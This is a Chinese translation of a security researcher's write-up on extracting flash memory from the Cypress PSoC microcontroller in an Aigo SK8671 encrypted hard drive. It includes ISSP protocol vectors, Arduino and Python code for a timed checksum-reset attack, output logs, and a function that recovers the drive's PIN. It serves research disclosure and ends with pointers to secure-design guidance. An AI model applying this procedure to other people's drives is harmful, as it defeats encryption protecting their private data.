> 原文链接: https://www.anquanke.com//post/id/101175 


# 爱国者HDD硬盘破解教程（下集）


                                阅读量   
                                **128375**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：syscall.eu
                                <br>原文地址：[https://syscall.eu/blog/2018/03/12/aigo_part2/](https://syscall.eu/blog/2018/03/12/aigo_part2/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t017c97973f10101c72.png)](https://p0.ssl.qhimg.com/t017c97973f10101c72.png)



### **传送门：**[爱国者HDD硬盘破解教程（上集）](https://www.anquanke.com/post/id/101017)



## 写在前面的话

在本系列文章的上集中，我们对爱国者SK8671移动硬盘的内部构造以及电路板运行情况进行了分析，在本系列文章的下集，我们将会告诉大家如何导出PSoC内部闪存数据（Cypress PSoC 1）。

### <a class="reference-link" name="%E9%95%BF%E8%AF%9D%E7%9F%AD%E8%AF%B4"></a>长话短说

我对ISSP协议进行了逆向分析，然后成功绕过了保护机制，最后成功导出了Cypress PSoC 1（CY8C21434）的闪存内存数据。这里，我可以直接导出硬盘驱动器的PIN码：

```
$ ./psoc.py
syncing: KO OK
[...]
PIN: 1 2 3 4 5 6 7 8 9
```

### <a class="reference-link" name="%E5%B7%A5%E5%85%B7%E8%8E%B7%E5%8F%96"></a>工具获取

Arduino for HSSP：【[传送门](https://github.com/trou/arduino_hssp)】<br>
Python驱动器+ISSP反汇编工具：【[传送门](https://github.com/trou/cypress_psoc_tools)】



## 介绍

从本系列文章的上集中我们可以看到，Cypress PSoC 1（CY8C21434）微型控制器看起来是一个很好的攻击目标，因为其中包含了设备PIN码。而且网上也没有公开的相关攻击代码，所以我准备深入研究一下。<br>
我们的目标是读取其内部闪存数据，因此下面这几步是我们必须实现的：
- 尝试与微控制器交互；
- 想办法检测其是否可以防止外部读取操作；
<li>想办法绕过防御机制；<br>
我们可以寻找有效PIN码的地方主要有下面这两个：</li>
- 内部闪存；
- SRAM（可能存储了需要跟用户输入的PIN码进行比对的数据）；


## ISSP协议

不同厂商生产的设备在与微控制器交互式可能是用的是不同的方法，但是绝大多数都需要使用一种串行协议（比如说ICSP）。<br>
Cypress自己的专用协议名叫ISSP，即系统串行编程协议【描述文档一】【描述文档二】。社区还有一个针对ISSP协议的开源项目，名叫HSSP【GitHub传送门】，本文接下来的测试过程需要使用到这个项目。<br>
ISSP的工作机制大致如下：
- 重置µC；
- 向µC的串行数据针脚输入特殊数值，并进入外部编程模式；
- 发送控制命令（攻击向量）；
ISSP文档中只定义了以下几种向量：

```
Initialize-1
Initialize-2
Initialize-3
ID-SETUP
READ-ID-WORD
SET-BLOCK-NUM: 10011111010dddddddd111，其中dddddddd=block #
BULK ERASE
PROGRAM-BLOCK
VERIFY-SETUP
READ-BYTE: 10110aaaaaaZDDDDDDDDZ1，其中DDDDDDDD = data out, aaaaaa = address (6 bits)
WRITE-BYTE: 10010aaaaaadddddddd111，其中dddddddd = data in, aaaaaa = address (6 bits)
SECURE
CHECKSUM-SETUP
READ-CHECKSUM: 10111111001ZDDDDDDDDZ110111111000ZDDDDDDDDZ1，其中DDDDDDDDDDDDDDDD = Device Checksum data out
ERASE BLOCK
```

比如说，针对Initialize-2的向量如下：

```
1101111011100000000111 1101111011000000000111
1001111100000111010111 1001111100100000011111
1101111010100000000111 1101111010000000011111
1001111101110000000111 1101111100100110000111
1101111101001000000111 1001111101000000001111
1101111000000000110111 1101111100000000000111
1101111111100010010111
```

每一个向量长度都是22位，似乎满足的是某种特定模式。幸运的是，HSSP文档给我们提供了很大的帮助，文档中暗示称：“ISSP向量只是代表一套指令集的比特位序列。“

### <a class="reference-link" name="%E5%90%91%E9%87%8F%E5%88%86%E6%9E%90"></a>向量分析

一开始，我认为这些命令向量可能是原始M8C指令，但相关的操作码并不匹配。于是我在Google上搜索了关于第一个向量的内容，然后发现了Ahmed Ismail的这篇【研究报告】，但是他并没有深入讨论细节内容，感兴趣的同学可以自行阅读了解。<br>
然后再阅读了技术手册的SROM章节之后，我们等到了很多有用的信息。SROM是硬编码（ROM）在PSoC中的，并且提供了很多功能函数（例如syscalls）：

```
00h : SWBootReset
01h : ReadBlock
02h : WriteBlock
03h : EraseBlock
06h : TableRead
07h : CheckSum
08h : Calibrate0
09h : Calibrate1
```

根据命令向量名称和SROM函数的比对结果，我们可以了解该协议所支持的各项功能以及相关的SROM参数。<br>
我们对之前命令向量的前三位进行了解码：

```
100 =&gt; “wrmem”
101 =&gt; “rdmem”
110 =&gt; “wrreg”
111 =&gt; “rdreg”
```

为了更好地了解协议的运行机制，我们还需要跟µC进行交互。

### <a class="reference-link" name="PSoC%E4%BA%A4%E4%BA%92"></a>PSoC交互

Dirk Petrautzki已经在Arduino上发布了Cypress的HSSP代码，我可以使用Arduino Uno来跟键盘PCB板的ISSP头通信。需要注意的是，在研究过程中我对Dirk的代码进行了大量的修改，你可以在我的GitHub上找到相关代码【传送门】。用于跟Arduino交互的Python脚本代码托管在我另一个GitHub库中【cypress_psoc_tools】。<br>
在Arduino的帮助下，为了使用VERIFY命令来尝试从内部ROM中读取数据，我一开始使用的是“官方“命令向量来进行通信。但是失败了，很可能是因为闪存拥有相应的保护机制。<br>
接下来，我又使用我自己的向量来读取/写入内存和寄存器。需要注意的是，我可以在闪存受保护的情况下读取整个SRAM。

### <a class="reference-link" name="%E8%AF%86%E5%88%AB%E5%86%85%E9%83%A8%E5%AF%84%E5%AD%98%E5%99%A8"></a>识别内部寄存器

在对向量进行了反编译之后，我发现某些未记录在文档中的寄存器（0xF8-0xFA）甚至可以直接定义并执行M8C操作码。这将允许我们运行各种操作命令，例如ADD、MOV A,X、PUSH和JMP等等。通过对寄存器的运行状态进行分析后，我可以识别出每个寄存器的真实作用（A, X, SP和PC）。<br>
HSSP_disas.rb生成的反编译向量如下：

```
--== init2 ==--
[DE E0 1C] wrreg CPU_F (f7), 0x00 # reset flags
[DE C0 1C] wrreg SP (f6), 0x00 # reset SP
[9F 07 5C] wrmem KEY1, 0x3A # Mandatory arg for SSC
[9F 20 7C] wrmem KEY2, 0x03 # same
[DE A0 1C] wrreg PCh (f5), 0x00 # reset PC (MSB) ...
[DE 80 7C] wrreg PCl (f4), 0x03 # (LSB) ... to 3 ??
[9F 70 1C] wrmem POINTER, 0x80 # RAM pointer for output data
[DF 26 1C] wrreg opc1 (f9), 0x30 # Opcode 1 =&gt; "HALT"
[DF 48 1C] wrreg opc2 (fa), 0x40 # Opcode 2 =&gt; "NOP"
[9F 40 3C] wrmem BLOCKID, 0x01 # BLOCK ID for SSC call
[DE 00 DC] wrreg A (f0), 0x06 # "Syscall" number : TableRead
[DF 00 1C] wrreg opc0 (f8), 0x00 # Opcode for SSC, "Supervisory SROM Call"
[DF E2 5C] wrreg CPU_SCR0 (ff), 0x12 # Undocumented op: execute external opcodes
```

### <a class="reference-link" name="%E5%AE%89%E5%85%A8%E6%AF%94%E7%89%B9"></a>安全比特

此时，我们已经可以跟PSoC交互了，但是我们需要关于闪存保护的详细信息。Cypress没有给用户提供任何检测设备保护状态的方法，我在网上搜索了一番之后，发现Cypress已经更新了HSSP代码。<br>
下面给出的是新出现的命令向量：

```
[DE E0 1C] wrreg CPU_F (f7), 0x00
[DE C0 1C] wrreg SP (f6), 0x00
[9F 07 5C] wrmem KEY1, 0x3A
[9F 20 7C] wrmem KEY2, 0x03
[9F A0 1C] wrmem 0xFD, 0x00 # Unknown args
[9F E0 1C] wrmem 0xFF, 0x00 # same
[DE A0 1C] wrreg PCh (f5), 0x00
[DE 80 7C] wrreg PCl (f4), 0x03
[9F 70 1C] wrmem POINTER, 0x80
[DF 26 1C] wrreg opc1 (f9), 0x30
[DF 48 1C] wrreg opc2 (fa), 0x40
[DE 02 1C] wrreg A (f0), 0x10 # Undocumented syscall !
[DF 00 1C] wrreg opc0 (f8), 0x00
[DF E2 5C] wrreg CPU_SCR0 (ff), 0x12
```

通过使用这个向量（psoc.py中的read_security_data），我们得到了SRAM（0x80，每个数据块2比特）中所有的安全比特数据。<br>
由此看来，“禁用外部读取“模式下，任何数据都是受保护的，所以我们不能通过向闪存写入输入来插入ROM导入工具。因此，如果想重置保护功能，我们只能擦除整块芯片。



## 首次攻击（失败）：ROMX

我们首先设想的是：既然我们可以执行任意操作码，为什么不直接执行ROMX来读取闪存数据呢？因为编程向量所使用的SROM ReadBlock函数会判断该命令是否是从ISSP调用的，而ROMX操作码并不会进行这种检测。<br>
Python代码（参考了Arduino C代码）如下：

```
for i in range(0, 8192):
write_reg(0xF0, i&gt;&gt;8) # A = 0
write_reg(0xF3, i&amp;0xFF) # X = 0
exec_opcodes("x28x30x40") # ROMX, HALT, NOP
byte = read_reg(0xF0) # ROMX reads ROM[A|X] into A
print "%02x" % ord(byte[0]) # print ROM byte
```

不幸的是，这并不管用。但我并不认为这是一种保护机制，我觉得是一种技术把戏，因为在执行外部操作码时，ROM总线会切换到一个临时缓冲区。



## 二次攻击：冷启动攻击

由于ROMX没效果，我感觉可以使用Johannes Obermaier和Stefan Tatschner在【这篇论文】的3.1章所介绍的方法。

### <a class="reference-link" name="%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"></a>攻击实现

ISSP手册给我们提供了下面这个CHECKSUM-SETUP向量：

```
[DE E0 1C] wrreg CPU_F (f7), 0x00
[DE C0 1C] wrreg SP (f6), 0x00
[9F 07 5C] wrmem KEY1, 0x3A
[9F 20 7C] wrmem KEY2, 0x03
[DE A0 1C] wrreg PCh (f5), 0x00
[DE 80 7C] wrreg PCl (f4), 0x03
[9F 70 1C] wrmem POINTER, 0x80
[DF 26 1C] wrreg opc1 (f9), 0x30
[DF 48 1C] wrreg opc2 (fa), 0x40
[9F 40 1C] wrmem BLOCKID, 0x00
[DE 00 FC] wrreg A (f0), 0x07
[DF 00 1C] wrreg opc0 (f8), 0x00
[DF E2 5C] wrreg CPU_SCR0 (ff), 0x12
```

而接下来代码会调用SROM函数0x07（Checksum函数），所以完整攻击的理论步骤如下：
1. 使用ISSP与设备连接；
1. 使用CHECKSUM-SETUP向量计算校验和；
1. 时间T后重置CPU；
1. 读取RAM来获取当前的校验值C；
1. 重复第三和第四步，每次增加时间T（增加一点点）；
<li>通过连续计算（减法）校验和C恢复闪存内容；<br>
实现该攻击的Arduino代码其实非常简单：</li>
```
case Cmnd_STK_START_CSUM:
checksum_delay = ((uint32_t)getch())&lt;&lt;24;
checksum_delay |= ((uint32_t)getch())&lt;&lt;16;
checksum_delay |= ((uint32_t)getch())&lt;&lt;8;
checksum_delay |= getch();
if(checksum_delay &gt; 10000) `{`
ms_delay = checksum_delay/1000;
checksum_delay = checksum_delay%1000;
`}`
else `{`
ms_delay = 0;
`}`
send_checksum_v();
if(checksum_delay)
delayMicroseconds(checksum_delay);
delay(ms_delay);
start_pmode();
```
1. 代码首先读取了checkum_delay；
1. 然后开始计算校验和（send_checksum_v）；
1. 等待一定的时间；
1. 将PSoC重置为prog模式（不需要发送初始向量）；
最终的Python攻击代码如下：

```
for delay in range(0, 150000): # delay in microseconds
for i in range(0, 10): # number of reads for each delay
try:
reset_psoc(quiet=True) # reset and enter prog mode
send_vectors() # send init vectors
ser.write("x85"+struct.pack("&gt;I", delay)) # do checksum + reset after delay
res = ser.read(1) # read arduino ACK
except Exception as e:
print e
ser.close()
os.system("timeout -s KILL 1s picocom -b 115200 /dev/ttyACM0 2&gt;&amp;1 &gt; /dev/null")
ser = serial.Serial('/dev/ttyACM0', 115200, timeout=0.5) # open serial port
continue
print "%05d %02X %02X %02X" % (delay, # read RAM bytes
read_regb(0xf1),
read_ramb(0xf8),
read_ramb(0xf9))
```

### <a class="reference-link" name="%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE"></a>读取数据

我们Python脚本的输出结果如下所示（经过简化处理，方便阅读）：



```
DELAY F1 F8 F9 # F1 is the unknown reg

            # F8 is the checksum LSB
            # F9 is the checksum MSB
00000 03 E1 19
[…]
00016 F9 00 03
00016 F9 00 00
00016 F9 00 03
00016 F9 00 03
00016 F9 00 03
00016 F9 00 00 # Checksum is reset to 0
00017 FB 00 00
[…]
00023 F8 00 00
00024 80 80 00 # First byte is 0x0080-0x0000 = 0x80
00024 80 80 00
00024 80 80 00
[…]
00057 CC E7 00 # 2nd byte is 0xE7-0x80: 0x67
00057 CC E7 00
00057 01 17 01 # I have no idea what’s going on here
00057 01 17 01
00057 01 17 01
00058 D0 17 01
00058 D0 17 01
00058 D0 17 01
00058 D0 17 01
00058 F8 E7 00 # E7 is back ?
00058 D0 17 01
[…]
00059 E7 E7 00
00060 17 17 00 # Hmmm
[…]
00062 00 17 00
00062 00 17 00
00063 01 17 01 # Oh ! Carry is propagated to MSB
00063 01 17 01
[…]
00075 CC 17 01 # So 0x117-0xE7: 0x30
```

注：每一个µs需要进行十次数据导出，所以导出8192字节的闪存数据大约需要48个小时。

### <a class="reference-link" name="%E9%87%8D%E6%9E%84%E9%97%AA%E5%AD%98%E9%95%9C%E5%83%8F"></a>重构闪存镜像

考虑到所有的时间问题，我现在还没有开发关于闪存恢复的代码。但是我确实恢复出了一部分数据，为了确保数据的正确性，我用m8cdis对其进行了反编译。结果证明数据没有问题，数据如下，

```
0000: 80 67 jmp 0068h ; Reset vector
[...]
0068: 71 10 or F,010h
006a: 62 e3 87 mov reg[VLT_CR],087h
006d: 70 ef and F,0efh
006f: 41 fe fb and reg[CPU_SCR1],0fbh
0072: 50 80 mov A,080h
0074: 4e swap A,SP
0075: 55 fa 01 mov [0fah],001h
0078: 4f mov X,SP
0079: 5b mov A,X
007a: 01 03 add A,003h
007c: 53 f9 mov [0f9h],A
007e: 55 f8 3a mov [0f8h],03ah
0081: 50 06 mov A,006h
0083: 00 ssc
[...]
0122: 18 pop A
0123: 71 10 or F,010h
0125: 43 e3 10 or reg[VLT_CR],010h
0128: 70 00 and F,000h ; Paging mode changed from 3 to 0
012a: ef 62 jacc 008dh
012c: e0 00 jacc 012dh
012e: 71 10 or F,010h
0130: 62 e0 02 mov reg[OSC_CR0],002h
0133: 70 ef and F,0efh
0135: 62 e2 00 mov reg[INT_VC],000h
0138: 7c 19 30 lcall 1930h
013b: 8f ff jmp 013bh
013d: 50 08 mov A,008h
013f: 7f ret
```

### <a class="reference-link" name="%E5%AE%9A%E4%BD%8DPIN%E7%A0%81%E5%9C%B0%E5%9D%80"></a>定位PIN码地址

既然我们可以实时读取任意节点的校验和，我们可以轻松判断下列情况：
1. 输入了错误PIN码；
<li>修改PIN码；<br>
首先，为了定位PIN码的大概地址，然后在重置之后导出了校验和（10ms一次）。我不断地输入了错误的PIN码。结果并不令人满意，但是我发现校验和在120000µs到140000µs之间会改变一次。于是我突然想到了SROM的CheckSum系统调用，这个函数有一个参数允许我们指定需要校验的数据块数量。因此，我们可以轻松定位到PIN码位置以及错误PIN码计数器：</li>
```
No bad PIN         | 14 tries remaining | 13 tries remaining

block 125 : 0x47E2 | block 125 : 0x47E2 | block 125 : 0x47E2
block 126 : 0x6385 | block 126 : 0x634F | block 126 : 0x6324
block 127 : 0x6385 | block 127 : 0x634F | block 127 : 0x6324
block 128 : 0x82BC | block 128 : 0x8286 | block 128 : 0x825B
```

接下来，我将PIN码从“123456”改成了“1234567”：

```
No bad try 14 tries remaining
block 125 : 0x47E2 block 125 : 0x47E2
block 126 : 0x63BE block 126 : 0x6355
block 127 : 0x63BE block 127 : 0x6355
block 128 : 0x82F5 block 128 : 0x828C
```

### <a class="reference-link" name="%E6%81%A2%E5%A4%8DPIN%E7%A0%81"></a>恢复PIN码

综上所述，我开发的代码可以直接恢复出PIN码：

```
def dump_pin():
pin_map = `{`0x24: "0", 0x25: "1", 0x26: "2", 0x27:"3", 0x20: "4", 0x21: "5",
0x22: "6", 0x23: "7", 0x2c: "8", 0x2d: "9"`}`
last_csum = 0
pin_bytes = []
for delay in range(145495, 145719, 16):
csum = csum_at(delay, 1)
byte = (csum-last_csum)&amp;0xFF
print "%05d %04x (%04x) =&gt; %02x" % (delay, csum, last_csum, byte)
pin_bytes.append(byte)
last_csum = csum
print "PIN: ",
for i in range(0, len(pin_bytes)):
if pin_bytes[i] in pin_map:
print pin_map[pin_bytes[i]],
print
```

代码的输出结果如下：

```
$ ./psoc.py
syncing: KO OK
Resetting PSoC: KO Resetting PSoC: KO Resetting PSoC: OK
145495 53e2 (0000) =&gt; e2
145511 5407 (53e2) =&gt; 25
145527 542d (5407) =&gt; 26
145543 5454 (542d) =&gt; 27
145559 5474 (5454) =&gt; 20
145575 5495 (5474) =&gt; 21
145591 54b7 (5495) =&gt; 22
145607 54da (54b7) =&gt; 23
145623 5506 (54da) =&gt; 2c
145639 5506 (5506) =&gt; 00
145655 5533 (5506) =&gt; 2d
145671 554c (5533) =&gt; 19
145687 554e (554c) =&gt; 02
145703 554e (554e) =&gt; 00
PIN: 1 2 3 4 5 6 7 8 9
```



## 总结

大家可以看到，我们成功地破解了这款加密硬盘的安全保护机制，因为它使用了普通的（非硬编码）微型控制器来存储PIN码。那么爱国者应该怎么办呢？在对其他几款加密HDD进行了分析之后，我们发布了这篇关于设计安全加密外部存储驱动器的【[研究报告](https://syscall.eu/pdf/syscan_2015_rigo_secure_hdd.pdf)】，并且给出了很多最佳实践方案，感兴趣的同学可以了解一下。
